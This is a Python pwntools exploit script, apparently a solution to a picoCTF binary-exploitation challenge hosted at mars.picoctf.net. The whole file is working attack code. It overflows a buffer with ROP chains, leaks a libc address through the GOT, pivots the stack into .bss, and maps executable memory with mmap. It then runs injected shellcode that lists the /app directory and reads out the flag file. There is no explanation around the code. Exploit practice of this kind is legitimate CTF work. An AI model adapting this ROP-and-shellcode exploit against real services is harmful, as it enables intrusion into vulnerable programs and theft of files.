from pwn import *

context.arch='amd64'
# HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'mars.picoctf.net', 31809
r = remote(HOST, PORT)

strlen_plt = 0x400760
write_plt = 0x400740
read_plt = 0x400790

read_got = 0x601fd8

pop_rdi = 0x400c03
pop_rsi_r15 = 0x400c01
pop_rsp_r13_r14_r15 = 0x400bfd


long_str = 0x400c28
bss = 0x602000

payload = b'A' * 40
payload += p64(pop_rdi) + p64(long_str)
payload += p64(strlen_plt)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
payload += p64(read_plt)
payload += p64(pop_rsp_r13_r14_r15) + p64(bss)

r.send(payload)

payload = b'A' * 24
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss + 200) + p64(0)
payload += p64(read_plt)
payload += p64(pop_rsp_r13_r14_r15) + p64(bss + 200)

r.sendline(payload)

r.recvuntil('/     /')
r.recvline()

libc_read = u64(r.recv(8))
libc = libc_read - 0x111130
libc_mmap = libc + 0x11ba20

pop_rdx_r12 = libc +0x11c371
pop_rcx = libc + 0x9f822
xor_r9_r9 = libc + 0xc9ccf

payload = flat([
    b'A' * 24,
    p64(pop_rdi) + p64(0x10000),
    p64(pop_rsi_r15) + p64(0x100000) + p64(0),
    p64(pop_rdx_r12) + p64(0x7) + p64(0),
    p64(pop_rcx) + p64(0x22),
    p64(xor_r9_r9),
    p64(libc_mmap),

    p64(pop_rdi) + p64(long_str),
    p64(strlen_plt),
    p64(pop_rdi) + p64(0),
    p64(pop_rsi_r15) + p64(0x10000) + p64(0),
    p64(read_plt),
    p64(0x10000)
])

r.send(payload)

sh = asm('''
    mov rax, 0x2f7070612f
    push rax
    mov rdi, rsp
    mov rax, 2
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov rdi, rax
    xor rax, rax
    mov rax, 217
    mov rsi, 0x100000
    mov rdx, 0x1000
    syscall

    xor rax, rax
    mov rax, 1
    mov rdi, 1
    mov rsi, 0x100000
    mov rdx, 0x1000
    syscall

    xor rax, rax
    mov rax, 0
    mov rdi, 0
    mov rsi, 0x10000+0x1000
    mov rdx, 0x1000
    syscall
''')

r.send(sh.ljust(0x1000, b'\x90'))
r.recvuntil('flag')
flag = r.recvuntil('.txt').strip().decode()
flag = 'flag' + flag
flag_path = f'/app/{flag}'[::-1].encode().hex()

sh = asm(f'''
    mov rax, 0x{flag_path[:4]}
    push rax
    mov rax, 0x{flag_path[4:20]}
    push rax
    mov rax, 0x{flag_path[20:36]}
    push rax
    mov rax, 0x{flag_path[36:52]}
    push rax
    mov rax, 0x{flag_path[52:68]}
    push rax
    mov rax, 0x{flag_path[68:84]}
    push rax
    mov rax, 0x{flag_path[84:100]}
    push rax
    mov rdi, rsp
    xor rax, rax
    mov rax, 2
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov r8, rax
    xor rax, rax
    mov rax, 9
    mov rdi, 0x20000
    mov rsi, 0x100
    mov rdx, 1
    mov r10, 2
    mov r9, 0
    syscall

    mov rsi, rax
    xor rax, rax
    mov rax, 1
    mov rdi, 1
    mov rdx, 0x100
    syscall
''')
r.recv(0x10000)
r.send(sh)

r.interactive()